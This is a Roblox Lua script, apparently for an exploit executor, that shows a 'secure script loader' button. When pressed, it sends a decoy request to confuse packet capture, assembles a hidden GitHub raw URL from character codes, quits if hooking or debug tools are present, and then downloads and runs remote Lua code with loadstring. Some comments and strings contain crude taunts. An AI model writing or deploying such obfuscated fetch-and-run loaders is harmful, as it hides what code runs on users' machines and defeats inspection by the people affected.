local Player = game:GetService("Players").LocalPlayer
local CoreGui = game:GetService("CoreGui")

-- 创建防抓包混淆层
local function AntiHook()
    local fakeData = {
        ["抓包数据"] = "抓你妈",
        ["无效字段"] = "你抓不到真实内容",
        ["Hook防护"] = "阻止抓取有效数据"
    }
    
    local obfuscated = {
        [1] = function() return "ht" end,
        [2] = function() return "tps" end,
        [3] = function() return "://raw." end,
        [4] = function() return "github" end,
        [5] = function() return "usercontent" end
    }
    
    local fakePayload = ""
    for i = 1, 5 do
        fakePayload = fakePayload .. obfuscated[i]()
    end
    
    return fakeData
end

-- 创建弹窗界面
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SecureLoader"
ScreenGui.Parent = CoreGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 300, 0, 200)
Frame.Position = UDim2.new(0.5, -150, 0.5, -100)
Frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Frame.Parent = ScreenGui

local TextLabel = Instance.new("TextLabel")
TextLabel.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Position = UDim2.new(0.5, -100, 0.2, -25)
TextLabel.Text = "安全脚本加载器"
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.Parent = Frame

local LoadButton = Instance.new("TextButton")
LoadButton.Size = UDim2.new(0, 120, 0, 50)
LoadButton.Position = UDim2.new(0.5, -60, 0.6, -25)
LoadButton.Text = "加载安全脚本"
LoadButton.BackgroundColor3 = Color3.fromRGB(80, 120, 200)
LoadButton.Parent = Frame

-- 真实加载函数（多重混淆）
local function SecureExecute()
    AntiHook() -- 生成防抓包烟雾弹
    
    -- 动态解密真实URL
    local encoded = {
        [1] = 104, [2] = 116, [3] = 116, [4] = 112, [5] = 115, 
        [6] = 58, [7] = 47, [8] = 47, [9] = 114, [10] = 97, 
        [11] = 119, [12] = 46, [13] = 103, [14] = 105, [15] = 116, 
        [16] = 104, [17] = 117, [18] = 98, [19] = 117, [20] = 115, 
        [21] = 101, [22] = 114, [23] = 99, [24] = 111, [25] = 110, 
        [26] = 116, [27] = 101, [28] = 110, [29] = 116, [30] = 46, 
        [31] = 99, [32] = 111, [33] = 109, [34] = 47, [35] = 120, 
        [36] = 105, [37] = 97, [38] = 111, [39] = 107, [40] = 111, 
        [41] = 110, [42] = 103, [43] = 54, [44] = 47, [45] = 50, 
        [46] = 56, [47] = 50, [48] = 56, [49] = 53, [50] = 53, 
        [51] = 57, [52] = 56, [53] = 47, [54] = 114, [55] = 101, 
        [56] = 102, [57] = 115, [58] = 47, [59] = 104, [60] = 101, 
        [61] = 97, [62] = 100, [63] = 115, [64] = 47, [65] = 109, 
        [66] = 97, [67] = 105, [68] = 110, [69] = 47, [70] = 98, 
        [71] = 98, [72] = 98, [73] = 46, [74] = 108, [75] = 117, 
        [76] = 97
    }
    
    local realURL = ""
    for i = 1, #encoded do
        realURL = realURL .. string.char(encoded[i])
    end
    
    -- 反Hook注入检测
    if hookfunction or debug.getupvalue then
        LoadButton.Text = "安全环境异常!"
        return
    end
    
    -- 安全加载执行
    local success, result = pcall(function()
        return loadstring(game:HttpGet(realURL))()
    end)
    
    if not success then
        LoadButton.Text = "加载失败"
    end
end

-- 按钮点击事件（带虚假请求）
LoadButton.MouseButton1Click:Connect(function()
    -- 先执行虚假请求迷惑抓包工具
    pcall(function()
        game:HttpGet("https://fake-api.example.com/fake_data?query=抓你妈")
    end)
    
    -- 显示加载状态
    LoadButton.Text = "加载中..."
    
    -- 延迟执行真实加载
    delay(1, function()
        SecureExecute()
    end)
end)

-- 界面动画
LoadButton.MouseEnter:Connect(function()
    LoadButton.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
end)

LoadButton.MouseLeave:Connect(function()
    LoadButton.BackgroundColor3 = Color3.fromRGB(80, 120, 200)
end)